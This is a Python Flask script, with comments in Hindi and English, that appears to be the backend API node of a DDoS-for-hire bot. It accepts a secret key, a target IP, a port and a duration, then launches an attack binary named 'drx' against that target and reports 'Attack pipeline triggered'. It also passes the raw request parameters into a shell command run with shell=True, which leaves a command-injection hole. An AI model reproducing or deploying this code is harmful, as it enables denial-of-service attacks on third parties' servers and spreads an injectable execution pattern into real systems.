import os
import sys
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)

# --- [ CONFIGURATION ] ---
# Ye wahi secret key hai jo aapke drx.py script me defined hai
API_SECRET = "DRX_PRIVATE_API" 

# Target Binary name jo execute hoga
BINARY_PATH = "./drx" 

@app.route('/handshake', methods=['GET'])
def handle_attack_request():
    # 1. Secret Key Verification (Security Check)
    secret = request.args.get('secret')
    if secret != API_SECRET:
        return jsonify({
            "status": "error", 
            "message": "Unauthorized API Access! Invalid Secret Key."
        }), 401

    # 2. Extract Query Parameters from Bot
    ip = request.args.get('ip')
    port = request.args.get('port')
    duration = request.args.get('time')
    user_key = request.args.get('key') # User tracking ke liye (Optional)

    # 3. Validation Check
    if not ip or not port or not duration:
        return jsonify({
            "status": "error", 
            "message": "Missing parameters! Required: ip, port, time"
        }), 400

    # 4. Binary Execution System Pipeline
    try:
        # Check agar target binary file system me exist karti hai
        if not os.path.exists(BINARY_PATH):
            return jsonify({
                "status": "error", 
                "message": f"Execution Binary '{BINARY_PATH}' not found on server!"
            }), 500

        # Command layout building (Jo pehle bot local system pe run karta tha)
        # Standard configuration format: ./drx <ip> <port> <time> 500
        binary_cmd = f"{BINARY_PATH} {ip} {port} {duration} 500"
        
        # Subprocess pipeline ko background (async) me execute karna taki API block na ho
        subprocess.Popen(
            binary_cmd, 
            shell=True, 
            stdout=subprocess.DEVNULL, 
            stderr=subprocess.DEVNULL
        )

        # 5. Success API JSON Log Output
        return jsonify({
            "status": "success",
            "message": "Attack pipeline triggered successfully via External API Node",
            "target": f"{ip}:{port}",
            "duration": f"{duration}s",
            "authorized_by": user_key
        }), 200

    except Exception as e:
        return jsonify({
            "status": "error", 
            "message": f"Server Core Error occurred: {str(e)}"
        }), 500

if __name__ == "__main__":
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("🚀 DRX PRIVATE BACKEND API NODE IS STARTING... 🚀")
    print("🌐 Listening on: http://0.0.0.0:5000")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    # Production Level ya testing background thread ke liye host/port definition
    app.run(host='0.0.0.0', port=5000, debug=False)
